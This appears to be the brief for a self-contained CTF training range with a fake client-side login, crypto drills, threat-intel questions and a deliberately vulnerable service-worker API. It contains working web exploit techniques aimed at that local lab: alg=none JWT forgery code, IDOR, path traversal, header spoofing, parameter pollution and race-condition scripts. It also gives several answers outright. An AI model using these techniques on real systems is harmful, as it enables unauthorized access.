# CyberWorld Login -- Training-Range Brief (v5)

> **FLLC Purple-Team OS · CyberWorld Training Range**
> *"Hack the impossible. Defend the future."*
> Provided as is for demonstration and educational purposes only. No
> real credentials are accepted, transmitted, or stored.

This range is a five-node CyberWorld breach run wrapped around a
defensive + offensive analyst CTF. It accepts any input that passes
its local validation, builds a fake session in `window.sessionStorage`,
registers a deliberately vulnerable service-worker backend at
`/CyberWorld_login/api/v1/*`, and forwards you to a console + lab +
Burp-style workbench that re-check everything client-side. No POST
ever leaves the origin.

*Do not enter real usernames, passwords, emails, or recovery
identifiers.* The login is bait so you can practise on it.

| Surface | URL | Role |
|---|---|---|
| Entry | `index.html` | login + Tier 1 audit surface (F01-F10) |
| Console | `console.html` | independent session re-verifier; Tier 1 rubric |
| Lab | `lab.html` | hub linking all four tiers; aggregate progress |
| Crypto | `crypto.html` | Tier 2 cryptanalysis (F11-F15) |
| Intel | `intel.html` | Tier 3 May-2026 threat intel (F16-F20) |
| Intercept | `intercept.html` | Tier 4 Burp-style API workbench (F21-F30) |
| SW backend | `sw-ctf.js` | service-worker fake server (Tier 4) |
| Recovery | `recovery.html` | local-only training ticket |
| Manifest | `manifest.json` | HMAC-SHA-256 signed; all fingerprints |
| Brief | `CHALLENGE.md` | this document |
| Robots | `robots.txt` | analyst breadcrumb + decoy index |
| Decoders | `../scripts/lsb_decode.py`, `../scripts/png_trailer_scan.py` | offline helpers |

The range is solvable with browser DevTools, `curl` / `httpie`,
Burp Suite (or `curl -H 'Authorization: Bearer ...'`), Python REPL,
`pngcheck`, `exiftool`, and a calculator. Intended completion time
is ~3 hours for a focused analyst.

If the full rubric feels heavy, use the guided Matrix route:

1. Open the gate at `index.html`.
2. Read the map in `lab.html` and choose a tier.
3. Use `console.html`, `crypto.html`, and `intel.html` for the first three tiers.
4. Finish in `intercept.html` with the Burp-style workbench.
5. Return to `/cyberworld.html` when the operator grant closes.

When the analyst closes all 33 findings, `localStorage.cw.role` is
set to `operator` -- the main `/cyberworld.html` MMO consumes that
grant to unlock operator-tier content for this browser.

---

## §A · Author Provenance & Manifest Verification

`manifest.json` is shipped with an integrity tag computed offline. The
tag is **HMAC-SHA-256** keyed on a published derivation. You can
re-compute it.

### A.0 · The Verification Key (published, by design)

```
K = SHA-256("cyberworld:training:v2:2026-05-26:personfu")
  = d8e02c04f74ec71feea211c61bb680261aa38f5e899b9f7100ae02e50ce86875
```

The key is *not* a secret. Its purpose is integrity & cross-document
binding, not provenance -- the moment the manifest is mutated in
transit the tag stops matching. Treat it like a published checksum.

### A.1 · Canonical Form

The signed body is the JSON object **without** the `signature` field,
serialized with sorted keys and no whitespace:

```python
canonical = json.dumps(body, separators=(",", ":"), sort_keys=True, ensure_ascii=False)
sig       = hmac.new(K, canonical.encode("utf-8"), hashlib.sha256).hexdigest()
```

The manifest body is ASCII-only, so `ensure_ascii=True` and `False`
produce identical canonical bytes.

### A.2 · Verify in Three Lines

```bash
python3 - <<'PY'
import json, hashlib, hmac
m = json.load(open("manifest.json"))
sig_obj = m.pop("signature")
K = hashlib.sha256(b"cyberworld:training:v2:2026-05-26:personfu").digest()
print("ok" if hmac.compare_digest(
    hmac.new(K, json.dumps(m, separators=(",",":"), sort_keys=True).encode(), hashlib.sha256).hexdigest(),
    sig_obj["value"]) else "MISMATCH")
PY
```

---

## §B · The 33-Finding Rubric

Each finding has a **canonical confirmation token** -- a fixed short
string. Each page that owns a finding writes that token to
`sessionStorage.cw.solved[n]` when the analyst proves they understand
the finding (either by pasting the token directly on the Console, or
by solving the page's interactive widget on Crypto / Intel).

The quickest way to play the range is to treat it like a breach map,
not a textbook. The pages are already labeled:

* `index.html` - gate and audit surface
* `lab.html` - route planner
* `console.html` - Tier 1 validator
* `crypto.html` - Tier 2 drills
* `intel.html` - Tier 3 brief
* `intercept.html` - Tier 4/5 workbench

`manifest.json[findings][n].answer_sha256_prefix` publishes the first
**32 bits** of SHA-256 of the canonical token. Pasting your candidate
into the Console will hash it locally and tell you whether the first
4 bytes match. You never need to send anything to a server; the
entire check is in your browser tab.

When you have all 33 prefixes, XOR them as 32-bit integers -- the
result is the published `master_xor`. This is a linear code over
**GF(2)<sup>32</sup>**:

```
master_xor = T1 XOR T2 XOR ... XOR T33
```

For the shipped v5 manifest, `master_xor = 0xd9693969` (33 findings across 5 tiers).

### Tier 1 -- Defensive Audit (F01-F10)

Observe the auth surface itself. Solved on `console.html`.

| # | Title |
|---|---|
| 1 | Client-side authentication only -- credentials never cross the network |
| 2 | Fake session stored in `window.sessionStorage` rather than issued by a backend |
| 3 | Content-Security-Policy is strict yet permits inline scripts (intentional) |
| 4 | Honeypot fields exist but are bot-friction only, not real security |
| 5 | PNG asset is treated as authentication material via fingerprint binding |
| 6 | PNG IEND tail + alpha-channel LSB carry training-data side channels |
| 7 | Weak-password blacklist is client-side and bypassable (Set + Bloom) |
| 8 | Hashcash-style proof-of-work is local; proves compute, not identity |
| 9 | Inline bootstrap script is the intentional teaching artifact, not malware |
| 10 | `console.html` re-validates the session independently, gating access twice |

### Tier 2 -- Cryptanalysis (F11-F15)

Live, interactive crypto challenges on `crypto.html`.

| # | Challenge | Math |
|---|---|---|
| 11 | Factor RSA-toy n=3233 | Trial division to sqrt(n) |
| 12 | RSA-toy decrypt c=352 | BigInt mod-exp: m = 352^2753 mod 3233 |
| 13 | ECDSA P-256 verify | WebCrypto `subtle.verify("ECDSA", ...)` on a real signature |
| 14 | 16-bit HMAC birthday collision | Find any preimage `s` s.t. HMAC-SHA-256(K, s)[0:16] = 0x5916 |
| 15 | Vigenere break | Key length 6 (Kasiski) + IC analysis; key = RIVEST |

### Tier 3 -- May 2026 Threat Intel (F16-F20)

May-2026 vintage advisories + attribution + stego, on `intel.html`.

| # | Challenge | Answer |
|---|---|---|
| 16 | Next.js middleware authorization bypass CVE | CVE-2025-29927 |
| 17 | MITRE ATT&CK for "use stolen valid credentials" | T1078 (Valid Accounts) |
| 18 | NIST SP 800-61 phase for "rotate exposed secrets + SHA-pin actions" | Eradication |
| 19 | Mandiant tracker for Ivanti Connect Secure exploitation since Dec 2024 | UNC5337 |
| 20 | Zero-width-space steganography in the intel brief | (flag from page) |

### Tier 4 -- Burp-Style Web Pentest (F21-F30)

A service worker at `sw-ctf.js` (scope `/CyberWorld_login/`) registers
a small, deliberately vulnerable backend at `/api/v1/*`. The
intercept workbench at `intercept.html` is your repeater. Real
exploits and obvious false flags coexist on purpose -- this tier
exists to train you to tell them apart.

| # | Exploit | Where |
|---|---|---|
| 21 | Discover the service worker that proxies `/api/v1/*` | DevTools -> Application -> Service Workers |
| 22 | Bypass JWT signature by using `alg: none` | GET `/api/v1/auth/whoami` with forged header |
| 23 | Verify `cw_role` cookie is decoy (only JWT role enforced) | Flip cookie; `/admin/users` still 403s |
| 24 | Forge JWT with `role: admin`, access `/api/v1/admin/users` | Authorization: Bearer hdr.payload. (alg=none) |
| 25 | IDOR: GET `/api/v1/profile?uid=42` returns operator | Enumerate uid 1..50; flag at 42 |
| 26 | Path traversal: GET `/api/v1/files?name=../etc/cyberworld.flag` | `../` is honored by the demo handler |
| 27 | X-Forwarded-For: 127.0.0.1 bypasses `/api/v1/admin/geo` | Add header and re-send |
| 28 | HPP: `?token=user&token=admin` returns admin (last wins) | `URLSearchParams.getAll` last value |
| 29 | Race: 5+ parallel POSTs to `/api/v1/redeem` stack counter | Promise.all over 6 fetches |
| 30 | Chain F22 + F24 + `X-Cw-Ops: cyberworld-operator` -> `/api/v1/internal/flag` | Master flag |

#### Obvious false flags (training your decoy radar)

These look exploitable. They are not. Notice them, log them, move on.

* `./.env.bak` -- watermarked `DECOY__...`; response carries `X-CTF-Decoy: true`
* `./.git/HEAD` -- points at `refs/heads/decoy-honeypot` (a real repo's HEAD references `main`/`master`)
* `./backup.zip` -- a `PK\x03\x04` header followed by junk; `unzip` fails
* `./admin.php`, `./wp-admin/` -- no PHP, no WordPress on a static site
* `./config.json` -- `api_key=DECOY...`, `jwt_secret=DECOY...`
* `GET /api/v1/debug?secret=admin` -- returns "thanks for trying"; `X-CTF-Decoy: true`
* `GET /api/v1/lab/sysinfo` -- lies about a server fingerprint that doesn't exist
* `GET /api/v1/__proto__/polluted` -- there is no prototype-pollution sink
* `<noscript><form action="/cgi-bin/cyberworld-login.cgi">` -- static host, no CGI
* `<div hidden data-fake-flag="CTF_FLAG{F00_decoy_only_real_flags_start_at_F21}">`
* HTML comment `CYBERWORLD_JWT_SECRET=DECOY__see_alg_none_F22`
* `REVDT1lfRjAwX25vdF9hX2ZsYWc=` (base64) -> `DECOY_F00_not_a_flag`
* Cookies `cw_admin_token`, `cw_csrf` -- backend never reads them

---

## §C · Math Reference

### C.0 · Hashcash (Adam Back, 2002)

The stamp format is:

```
1 : bits : date : resource : ext : rand : counter
```

The page builds:

```
1:18:YYYYMMDD:cyberworld:training:<rand-b64>:<counter>
```

then accepts the *first* counter whose `SHA-256(stamp)` begins with
**18 leading zero bits**. With a fair coin model the number of
counters needed is **geometrically distributed** with parameter
`p = 2^-18`. Expected work:

```
E[counter] = 1/p = 2^18 ~= 2.62 x 10^5 hashes
Pr[counter > c] = (1 - p)^c
sigma[counter] = sqrt(1 - p) / p ~= 2.62 x 10^5
```

Wall-clock at ~50 000 hashes/sec in WebCrypto subtle -> ~5 s; tuned
to be felt without being painful.

### C.1 · Shamir Secret Sharing over GF(2^8) (Shamir, CACM 1979)

A demonstration of (k=3, n=6) Shamir shares of a 32-byte key.
Reconstruction uses Lagrange interpolation in the AES field
**GF(2^8) = F2[x] / (x^8 + x^4 + x^3 + x + 1)**:

```
S(0) = sum_{j in J} y_j * prod_{m in J, m != j} (x_m / (x_m XOR x_j))   (all in GF(2^8))
```

The demo is exposed by helper code in `index.html` and is not on the
auth path.

### C.2 · CRC-32 (IEEE 802.3, reflected polynomial 0xEDB88320)

```
g(x) = x^32 + x^26 + x^23 + x^22 + x^16 + x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x + 1
```

For the shipped `seal.png` the expected CRC-32 of the 79-byte alpha-
LSB payload is `0xb2e976a3` (also stored in `manifest.json`).

### C.3 · RSA-Toy (F11 + F12)

Deliberately under-sized so the analyst can factor `n` by hand and
observe why client-side public-key crypto with toy parameters is
meaningless:

```
n  = 3233 = 53 * 61
phi(n) = 52 * 60 = 3120
e  = 17,  d = e^(-1) mod phi(n) = 2753   (since 17 * 2753 = 46801 = 15*3120 + 1)
c  = m^e  mod n  -> m = c^d  mod n
```

For F12 the published ciphertext is `c = 352` and decrypts to
`m = 2026` (the year of the brief).

### C.4 · ECDSA over NIST P-256 (F13)

Signature `(r, s)` over `H = SHA-256(M)` with curve order `n` and
private scalar `d`. Verification reads:

```
u1 = H * w mod n,   u2 = r * w mod n,   w = s^(-1) mod n
(x1, y1) = u1 * G + u2 * Q
accept if  x1 mod n == r
```

The browser does this via `crypto.subtle.verify({name:"ECDSA",
hash:"SHA-256"}, key, sig, msg)`. The public key is published in
`manifest.json[challenge_artifacts][ecdsa_p256]` and embedded in
`crypto.html`.

### C.5 · 16-bit HMAC Birthday Collision (F14)

For a uniform 16-bit truncation, the birthday-bound expected number
of preimages until a 50% collision is `sqrt(pi/2 * 2^16) ~= 320`.
In practice grinding 200-300 random preimages will yield a match.
`crypto.html` ships a built-in grinder so the analyst can watch the
distribution converge.

### C.6 · Vigenere over Z/26 (F15)

Plaintext `p_i` and ciphertext `c_i` related by

```
c_i = (p_i + k_{i mod L}) mod 26
```

where `L` is the key length. Break via Kasiski (look for repeated
trigrams whose offsets share a common factor) and per-column Index
of Coincidence:

```
IC(text) = sum_{a in A-Z} n_a * (n_a - 1) / (N * (N - 1))
```

English plaintext has `IC ~= 0.067`; random text `~= 0.038`. The IC
spike at L = 6 reveals the key length; per-column frequency matching
recovers each shift.

### C.7 · Bloom-Filter Weak-Password Check (F07)

256-bit Bloom filter with `k = 3` independent hash functions
derived from SHA-256:

```
h_i(x) = SHA-256(i || ":" || x) interpreted as uint32  mod  256
m in B  iff  B[h_i(m)] == 1  for all i in {0, 1, 2}
```

Bloom filters give **false positives but no false negatives**.

### C.8 · Zero-Width-Space Steganography (F20)

Two invisible code points carry one bit each:

```
U+200B (ZERO WIDTH SPACE)    -> bit 0
U+200D (ZERO WIDTH JOINER)   -> bit 1
```

Eight bits per ASCII byte, MSB first. `intel.html`'s brief paragraph
contains the encoded flag between two readable words; the page's
*Auto-extract* button walks the brief's `textContent` and rebuilds
the payload.

### C.9 · Session Token Binding

```
session = { v, u, a, n, i, e, h }
  v = 2                              (schema version)
  u = SHA-256(handle)[0:24]          (handle fingerprint)
  a = SHA-256(seal.png file)[0:24]   (asset binding)
  n = Hashcash counter               (PoW proof)
  i = issued (ms since epoch)
  e = i + 5 * 60 * 1000               (expires)
  h = full Hashcash stamp             (replay-checked at console)

session.s = HMAC-SHA-256(K, canonical(session) || tail24)[0:32]
```

Both `index.html` and `console.html` independently recompute
`session.s` from the live asset; either page rejects the session if
any field has been mutated. This is the intentional double-gating
behind F10.

---

## §D · Why CSP Allows `'unsafe-inline'`

```http
default-src 'self'; script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline'; img-src 'self' data:;
connect-src 'self'; form-action 'none'; base-uri 'self';
object-src 'none'; upgrade-insecure-requests
```

The directive is deliberately mixed -- strong on `default-src`,
`base-uri`, `form-action`, `object-src`, and `connect-src`; weak on
`script-src` by allowing inline. This is exactly the tension the
analyst should write up as Finding F03:

* If we tighten `script-src` to `'self'`, the page becomes a thin
  shell loading an external JS file and the CTF surface moves out of
  `index.html`. Most analysts would never read the external file;
  the lesson is lost.
* By keeping the script inline *and* removing `'unsafe-inline'`, the
  page refuses to run at all (the browser will block its own
  bootstrap).
* The mixed CSP is therefore an instructive failure mode -- strong-
  *looking* policy that still permits the page's own large inline
  payload to execute.

A production page should host the bootstrap externally and drop
`'unsafe-inline'`. The training page does not.

---

## §E · References

1. Adam Back, *Hashcash -- A Denial of Service Counter-Measure*, 2002.
2. Adi Shamir, "How to share a secret", CACM 22(11):612-613, 1979.
3. R. Rivest, A. Shamir, L. Adleman, "A method for obtaining digital
   signatures and public-key cryptosystems", CACM 21(2):120-126, 1978.
4. T. Boutell et al., RFC 2083, *PNG Specification* (esp. sec. 11 chunks, sec. 12 IEND).
5. NIST FIPS 180-4, *Secure Hash Standard* (SHA-256).
6. NIST FIPS 186-5, *Digital Signature Standard* (ECDSA over P-256).
7. NIST FIPS 198-1, *HMAC*.
8. NIST SP 800-61 Rev.3, *Computer Security Incident Handling Guide*.
9. MITRE ATT&CK Enterprise Matrix, T1078 *Valid Accounts*.
10. OWASP, *Authentication Cheat Sheet*, 2025.
11. OWASP, *Content Security Policy Cheat Sheet*, 2025.
12. CISA Alert AA24-179A, *Widespread supply-chain compromise impacting polyfill.io*.
13. Vercel, *CVE-2025-29927: Next.js middleware authorization bypass*, March 2025.
14. Mandiant, *Ivanti Connect Secure CVE-2025-0282 -- UNC5337*, January 2025.
15. M. Bellare, R. Canetti, H. Krawczyk, "Keying hash functions for
    message authentication" (HMAC), CRYPTO '96.
16. F. Kasiski, *Die Geheimschriften und die Dechiffrir-Kunst*, 1863
    (Vigenere repeated-trigram method).
17. W. F. Friedman, *The Index of Coincidence and its Applications in
    Cryptography*, 1922.

---

## §G · Tier-4 Endpoint Catalog (`sw-ctf.js`)

The service-worker registers with scope `/CyberWorld_login/` and
intercepts every same-origin fetch. Endpoints under `/api/v1/` are
deliberately vulnerable; the rest is the real static surface.

| Method | Path | Behaviour |
|---|---|---|
| GET | `/api/v1/debug/echo` | Reflects method + URL + headers + query; recon tool |
| GET | `/api/v1/auth/issue?sub=X&role=Y` | Mints HS256 JWT signed with weak key `cyberworld` |
| GET | `/api/v1/auth/whoami` | Decodes Bearer JWT; `alg=none` accepted (F22) |
| GET | `/api/v1/profile?uid=N` | IDOR; uid=42 is the operator profile (F25) |
| GET | `/api/v1/admin/users` | Requires Bearer JWT `role=admin` (F24) |
| GET | `/api/v1/admin/geo` | Requires `X-Forwarded-For: 127.0.0.1` (F27) |
| GET | `/api/v1/files?name=X` | Path-traversal demo; `../etc/cyberworld.flag` wins (F26) |
| GET | `/api/v1/hpp?token=X&token=Y` | HPP last-write-wins (F28) |
| POST | `/api/v1/redeem` | Process-wide counter races past 5 (F29) |
| GET | `/api/v1/internal/flag` | Chain F22 + F24 + `X-Cw-Ops: cyberworld-operator` (F30) |

Decoy endpoints / files (each carries `X-CTF-Decoy: true` or is otherwise marked):

* `/api/v1/debug?secret=admin`
* `/api/v1/lab/sysinfo`
* `/api/v1/__proto__/polluted`
* `/CyberWorld_login/.env.bak`
* `/CyberWorld_login/.git/HEAD`
* `/CyberWorld_login/backup.zip`
* `/CyberWorld_login/config.json`
* `/CyberWorld_login/admin.php`
* `/CyberWorld_login/wp-admin/`

### G.1 · Forging an `alg=none` JWT by hand

```python
import base64, json
def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
hdr = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
pl  = b64u(json.dumps({"sub":"forged-operator","role":"admin","iat":1779852000,"exp":1779938400}).encode())
print(hdr + "." + pl + ".")
```

Send the result as `Authorization: Bearer <hdr>.<pl>.` (note the
trailing dot -- the signature segment is intentionally empty).

### G.2 · Race-condition exploitation

```js
await Promise.all(
  Array.from({length:6}, () =>
    fetch("api/v1/redeem", { method: "POST" })
      .then(r => r.json()))
);
```

The counter is process-wide in the service worker and is not
guarded; six parallel POSTs race past the `REDEEM_THRESHOLD=5`
gate. `intercept.html`'s "Race 6x POST /redeem" button does this
for you.

### G.3 · Chaining for the master flag (F30)

```http
GET /CyberWorld_login/api/v1/internal/flag HTTP/1.1
Authorization: Bearer <alg=none header>.<role=admin payload>.
X-Cw-Ops: cyberworld-operator
```

Response includes `master_flag: CTF_FLAG{F30_...}` and `cyberworld_grant: operator`,
which triggers the MMO handoff: `localStorage.cw.role = 'operator'`.

---

## §F · Out of Scope

* No live network. No POST. No fetch to anything other than
  `assets/seal.png` and `manifest.json` on the same origin.
* No persistent state outside `window.sessionStorage` (the entire
  session is cleared by closing the tab).
* No cookies. No analytics. No telemetry. The CSP refuses
  `connect-src` to anything but `'self'`.
* No third-party libraries. The range is six static HTML files plus
  a 14 KB PNG plus a 5 KB icon plus this brief plus the JSON
  manifest.
